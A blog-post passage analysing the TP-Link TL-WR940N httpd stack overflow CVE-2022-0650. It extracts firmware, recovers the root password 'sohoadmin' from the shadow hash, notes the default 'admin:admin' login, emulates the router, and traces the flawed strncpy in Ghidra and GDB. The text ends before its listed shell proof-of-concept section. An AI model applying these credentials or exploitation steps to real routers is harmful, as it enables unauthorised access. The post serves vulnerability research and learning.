<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2022-0650 Analysis &amp; POC - 0xMesbaha</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/">
  <meta property="og:site_name" content="0xMesbaha">
  <meta property="og:title" content="CVE-2022-0650 Analysis & POC">
  <meta property="og:description" content="Recently i was exploring Firmware analysis and iot exploitation domain out of curiosity , and it turned out to be very interesting to me. i spent a while studying Exploitation Basics , Solving Basic PWN &amp; Reverse Engineering Challanges and Checking IOT Pentesting Course From FahemSec. I Spent days analyzing firmware and binaries in Ghidra and GDB and Finally I was able to reproduce couple of CVEs on TpLink Routers and even discover new ones!">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-30T12:49:18+02:00">
    <meta property="article:modified_time" content="2025-09-30T12:49:18+02:00">
    <meta property="article:tag" content="CVE">
    <meta property="article:tag" content="Firmware-Analysis">
    <meta property="article:tag" content="Exploitation">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2022-0650 Analysis & POC">
  <meta name="twitter:description" content="Recently i was exploring Firmware analysis and iot exploitation domain out of curiosity , and it turned out to be very interesting to me. i spent a while studying Exploitation Basics , Solving Basic PWN &amp; Reverse Engineering Challanges and Checking IOT Pentesting Course From FahemSec. I Spent days analyzing firmware and binaries in Ghidra and GDB and Finally I was able to reproduce couple of CVEs on TpLink Routers and even discover new ones!">
      <meta name="twitter:site" content="@tinkerhell1337">
<meta name="application-name" content="0xMesbaha">
<meta name="apple-mobile-web-app-title" content="0xMesbaha">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hussienmisbah.github.io/posts/exploitation/2025-10-01-cve-2022-0650-analysis/" /><link rel="prev" href="https://hussienmisbah.github.io/posts/code-review/2025-05-29-jdbcleak-egcert-finals/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2022-0650 Analysis \u0026 POC",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/hussienmisbah.github.io\/posts\/exploitation\/2025-10-01-cve-2022-0650-analysis\/"
        },"genre": "posts","keywords": "CVE, Firmware-Analysis, Exploitation","wordcount":  1473 ,
        "url": "https:\/\/hussienmisbah.github.io\/posts\/exploitation\/2025-10-01-cve-2022-0650-analysis\/","datePublished": "2025-09-30T12:49:18+02:00","dateModified": "2025-09-30T12:49:18+02:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "0xMesbaha"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'dark';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="0xMesbaha">0xMesbaha</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="0xMesbaha">0xMesbaha</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2022-0650 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/exploitation/">Exploitation</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-30">2025-09-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1473 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#setting-up-environment">Setting Up Environment</a>
      <ul>
        <li><a href="#getting-firmware">Getting Firmware</a></li>
        <li><a href="#firmadyne-emulation">Firmadyne Emulation</a></li>
        <li><a href="#locating-httpd-binary">Locating Httpd Binary</a></li>
      </ul>
    </li>
    <li><a href="#analyzing-the-binary">Analyzing the Binary</a></li>
    <li><a href="#debugging-and-overwriting-pc">Debugging and Overwriting PC</a>
      <ul>
        <li><a href="#setting-up-gdb">Setting up GDB</a></li>
        <li><a href="#overwriting-pc">Overwriting PC</a></li>
        <li><a href="#stack-analysis">Stack Analysis</a></li>
      </ul>
    </li>
    <li><a href="#poc-for-a-shell">POC For a Shell</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Recently i was exploring Firmware analysis and iot exploitation domain out  of curiosity , and it turned out to be very interesting to me. i spent a while studying Exploitation Basics , Solving Basic PWN &amp; Reverse Engineering Challanges and Checking IOT Pentesting Course From <a href="https://fahemsec.com/course/7" target="_blank" rel="noopener noreffer ">FahemSec</a>. I Spent days analyzing firmware and binaries in Ghidra and GDB and Finally I was able to reproduce couple of CVEs on TpLink Routers and even discover new ones!</p>
<p>In This Post i am analyzing the <a href="https://www.zerodayinitiative.com/advisories/ZDI-22-407/" target="_blank" rel="noopener noreffer ">CVE-2022-0650</a> which as described a
<em>&ldquo;TP-Link TL-WR940N httpd newBridgessid Stack-based Buffer Overflow Remote Code Execution Vulnerability&rdquo;</em></p>
<p>This CVE has no public POC although it has been almost 3 years so i made one for it that executes a shell eventually.</p>
<h2 id="setting-up-environment">Setting Up Environment</h2>
<h3 id="getting-firmware">Getting Firmware</h3>
<p>We don&rsquo;t need to buy this specifc router to analyze/reproduce bugs , Most of TpLink Firmwares are public on their website to download. we can download that version from <a href="https://www.tp-link.com/us/support/download/tl-wr940n/#Firmware" target="_blank" rel="noopener noreffer ">here</a>.</p>
<p>after downloading it we got <code>.bin</code> file which is the firmware file. we can inspect the SquashFS system if we want by running</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> binwalk -e fw.bin 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">15120</span>         0x3B10          LZMA compressed data, properties: 0x5D, dictionary size: <span class="m">33554432</span> bytes, uncompressed size: <span class="m">95708</span> bytes
</span></span><span class="line"><span class="cl"><span class="m">131584</span>        0x20200         LZMA compressed data, properties: 0x5D, dictionary size: <span class="m">33554432</span> bytes, uncompressed size: <span class="m">2589532</span> bytes</span></span></code></pre></div></div>
<p>This will extract recognized embedded files automatically into <code>_fw.bin.extracted</code> and we can find <code>squashfs-root</code> which contains the file system. This will not be very helpful for our blog post but we can read the root shadow file and get the password as we will use it latter</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat etc/shadow  
</span></span><span class="line"><span class="cl">root:<span class="nv">$1$GTN</span>.gpri<span class="nv">$DlSyKvZKMR9A9Uj9e9wR3</span>/:15502:0:99999:7:::</span></span></code></pre></div></div>
<p>Searching the password online will find it is <code>sohoadmin</code></p>
<h3 id="firmadyne-emulation">Firmadyne Emulation</h3>
<p>As we have the firmware binary file we can try emulate it with <code>firmadyne</code> tool From <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener noreffer ">Repo</a> it uses Qemu to emulate that image.</p>
<p>After setting it up and configure what needed as repo mentions , we can run the binary , <code>1</code> is the image id which will be <code>1</code> for your first image</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">firmadyne/scratch/1/run.sh 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Creating TAP device tap1_0...
</span></span><span class="line"><span class="cl">Set <span class="s1">&#39;tap1_0&#39;</span> persistent and owned by uid <span class="m">1000</span>
</span></span><span class="line"><span class="cl">Bringing up TAP device...
</span></span><span class="line"><span class="cl">Adding route to 192.168.0.1...
</span></span><span class="line"><span class="cl">Starting firmware emulation... use Ctrl-a + x to <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> Linux version 2.6.39.4+ <span class="o">(</span>ddcc@ddcc-virtual<span class="o">)</span> <span class="o">(</span>gcc version 5.3.0 <span class="o">(</span>GCC<span class="o">)</span> <span class="o">)</span> <span class="c1">#2 Tue Sep 1 18:08:53 EDT 2020</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> bootconsole <span class="o">[</span>early0<span class="o">]</span> enabled
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> CPU revision is: <span class="m">00019300</span> <span class="o">(</span>MIPS 24Kc<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> FPU revision is: <span class="m">00739300</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> Determined physical RAM map:
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span>  memory: <span class="m">00001000</span> @ <span class="m">00000000</span> <span class="o">(</span>reserved<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span>  memory: 000ef000 @ <span class="m">00001000</span> <span class="o">(</span>ROM data<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span>  memory: <span class="m">00678000</span> @ 000f0000 <span class="o">(</span>reserved<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span>  memory: 0f897000 @ <span class="m">00768000</span> <span class="o">(</span>usable<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> debug: ignoring loglevel setting.
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> Wasting <span class="m">60672</span> bytes <span class="k">for</span> tracking <span class="m">1896</span> unused pages
</span></span><span class="line"><span class="cl"><span class="o">[</span>    0.000000<span class="o">]</span> Initrd not found or empty - disabling initrd
</span></span><span class="line"><span class="cl">... </span></span></code></pre></div></div>
<p>and when it asks for password we will write the one we had before from shadow file.</p>
<p>after getting shell we will enable iptables and start services with <code>rcS</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -F <span class="p">&amp;</span> iptables -P INPUT ACCEPT 
</span></span><span class="line"><span class="cl">sh /etc/rc.d/rcS</span></span></code></pre></div></div>
<p>we should be able to access router web portal now</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>mesbah㉿firmware<span class="o">)</span>-<span class="o">[</span>~/Desktop/firmadyne<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ curl 192.168.0.1
</span></span><span class="line"><span class="cl">&lt;META http-equiv<span class="o">=</span>Content-Type <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=iso-8859-1&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;HTML&gt;
</span></span><span class="line"><span class="cl">&lt;HEAD&gt;&lt;TITLE&gt;TL-WR740N/TL-WR741ND&lt;/TITLE&gt;
</span></span><span class="line"><span class="cl">&lt;META http-equiv<span class="o">=</span>Pragma <span class="nv">content</span><span class="o">=</span>no-cache&gt;
</span></span><span class="line"><span class="cl">&lt;META http-equiv<span class="o">=</span>Expires <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;wed, 26 Feb 1997 08:21:57 GMT&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;SCRIPT <span class="nv">language</span><span class="o">=</span><span class="s2">&#34;javascript&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;&lt;!--
</span></span><span class="line"><span class="cl">//--&gt;&lt;/SCRIPT&gt;
</span></span><span class="line"><span class="cl">&lt;SCRIPT <span class="nv">language</span><span class="o">=</span><span class="s2">&#34;javascript&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;
</span></span><span class="line"><span class="cl">var <span class="nv">httpAutErrorArray</span> <span class="o">=</span> new Array<span class="o">(</span>
</span></span><span class="line"><span class="cl">3, 1, <span class="s2">&#34;http://192.168.0.1&#34;</span>, 0,0 <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">&lt;/SCRIPT&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;SCRIPT <span class="nv">language</span><span class="o">=</span><span class="s2">&#34;javascript&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>window.parent !<span class="o">=</span> window<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">        document.cookie <span class="o">=</span> <span class="s2">&#34;Authorization=;path=/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        window.parent.location.href <span class="o">=</span> httpAutErrorArray<span class="o">[</span>2<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">&lt;/SCRIPT&gt;
</span></span><span class="line"><span class="cl">&lt;script <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;../login/encrypt.js&#34;</span> /&gt;&lt;/script&gt;
</span></span><span class="line"><span class="cl">&lt;style <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span>&gt;</span></span></code></pre></div></div>
<h3 id="locating-httpd-binary">Locating Httpd Binary</h3>
<p>The Firmware Binary file itself contains alot of data like filesystem , binaries ,services and more. we are analyzing those services/binaries , Logging into the webportal (default creds are <code>admin:admin</code>) will find the following URL Format :</p>
<ul>
<li><code>NTOYIHJBBFEPWVDA</code> is changed each time we login as it is related to session</li>
</ul>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>http://192.168.0.1/NTOYIHJBBFEPWVDA/userRpm/Index.htm</code></pre></div>
<p>If we searching in the squashFs files for what binaries might include that URI will find <code>/usr/bin/httpd</code> , that is not always the case you might find it in a directory contins web pages and you need to trace it back to find the binary. But for Tplink it is usually <code>/usr/bin/httpd</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>mesbah㉿firmware<span class="o">)</span>-<span class="o">[</span>~/Desktop/_fw.bin.extracted/squashfs-root<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ grep -ria <span class="s1">&#39;Index.htm&#39;</span> .
</span></span><span class="line"><span class="cl">/userRpm/BannerRpm.htm/userRpm/MainRpm.htm/userRpm/LogoutRpm.htmLogoutRpm/userRpm/MenuRpm.htmWzdStepOnlyBasic visibleMenuList<span class="s2">&#34;WzdStartRpm&#34;</span>,
</span></span><span class="line"><span class="cl">./usr/bin/httpd:window.parent.location.href <span class="o">=</span> <span class="s2">&#34;%s/%s/userRpm/Index.htm&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">*/*/Index.htm/images/*/fs/images/*/frames/*/fs/frames/*/dynaform/*/fs/dynaform/*/userRpm/*/</span></span></code></pre></div></div>
<p>Drop the httpd Binary to Ghidra and start analysis.</p>
<h2 id="analyzing-the-binary">Analyzing the Binary</h2>
<p>The Advisory Contains <em>&ldquo;TP-Link TL-WR940N httpd newBridgessid Stack-based Buffer Overflow Remote Code Execution Vulnerability&rdquo;</em></p>
<p>We have a place to start from , searching for <code>newBridgessid</code> we will find the following string which has a reference in <code>FUN_0045b218</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/1.png"
        data-srcset="/assets/images/CVE-2022-0650/1.png, /assets/images/CVE-2022-0650/1.png 1.5x, /assets/images/CVE-2022-0650/1.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/1.png"
        title="img" /></p>
<p>Inspecting The Function we can understand the root cause of the Bug , although <code>strncpy</code> is more safe than <code>strcpy</code> as it has additional parameter that specifies the length to copy from source to destination. in this code snippet the length is not the destination length instead it is the source length , source here is our parameter input &ldquo;newBridgessid&rdquo;</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/2.png"
        data-srcset="/assets/images/CVE-2022-0650/2.png, /assets/images/CVE-2022-0650/2.png 1.5x, /assets/images/CVE-2022-0650/2.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/2.png"
        title="img" /></p>
<p>This means we can write on stack beyond the local variable specified length which can overwrite the <code>RIP</code> Eventually , side note in MIPs Architecture <code>RIP</code> is called <code>PC</code> :)</p>
<p>In Ghidra Traceback the function callers we will find</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-C">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">httpWlanBasicCfgRpmsInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">menuItemListAdd</span><span class="p">(</span><span class="s">&#34;WlanNetworkRpm&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">httpRpmConfAdd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">&#34;/userRpm/WlanNetworkRpm.htm&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_0045c6fc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">httpRpmConfAdd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">&#34;/userRpm/WlanNetworkRpm_AP.htm&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_0045c6f0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">httpRpmConfAdd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">&#34;/userRpm/WlanNetworkRpm_APC.htm&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_0045c6e4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">unCheckRefererUrlAdd</span><span class="p">(</span><span class="s">&#34;/userRpm/popupSiteSurveyRpm.htm&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">unCheckRefererUrlAdd</span><span class="p">(</span><span class="s">&#34;/userRpm/popupSiteSurveyRpm_AP.htm&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">httpRpmConfAdd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">&#34;/userRpm/popupSiteSurveyRpm.htm&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_0045d644</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">httpRpmConfAdd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">&#34;/userRpm/popupSiteSurveyRpm_AP.htm&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">LAB_0045d638</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>and we will find our function call here , so the page <code>WlanNetworkRpm.htm</code> is handled by that vulnerable function <code>FUN_0045b218</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-C">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">UndefinedFunction_0045c6fc</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">FUN_0045b218</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>One Thing Before Starting the Debgugging and POC Section , in the <code>run.sh</code> file for image emulation i added <code>norandmaps</code> in the <code>Qemu</code> Command to disable the ASLR.</p>
<h2 id="debugging-and-overwriting-pc">Debugging and Overwriting PC</h2>
<p>The page doesn&rsquo;t seem to be accessed from the UI , but we can capture a valid request and add parameters as following</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/CVE-2022-0650/3.png"
        data-srcset="/assets/images/CVE-2022-0650/3.png, /assets/images/CVE-2022-0650/3.png 1.5x, /assets/images/CVE-2022-0650/3.png 2x"
        data-sizes="auto"
        alt="/assets/images/CVE-2022-0650/3.png"
        title="img" /></p>
<h3 id="setting-up-gdb">Setting up GDB</h3>
<p>To be able to use GDB First we need to move <code>gdb-server</code> to the image first , we can do that easily by running <code>scripts/mount.sh 1</code> and move it there and run <code>scripts/umount.sh 1</code> to unmount it then run the image again.</p>
<p>Get the <code>httpd</code> process (last one in processes) and run the gdb server</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./gdbserver-7.12-mips-be-stripped --attach :1234 <span class="m">813</span>
</span></span><span class="line"><span class="cl">Attached<span class="p">;</span> <span class="nv">pid</span> <span class="o">=</span> <span class="m">813</span>
</span></span><span class="line"><span class="cl">Listening on port <span class="m">1234</span></span></span></code></pre></div></div>
<p>Now From Your machine connect to it and make a breakpoint on <code>strncpy</code></p>
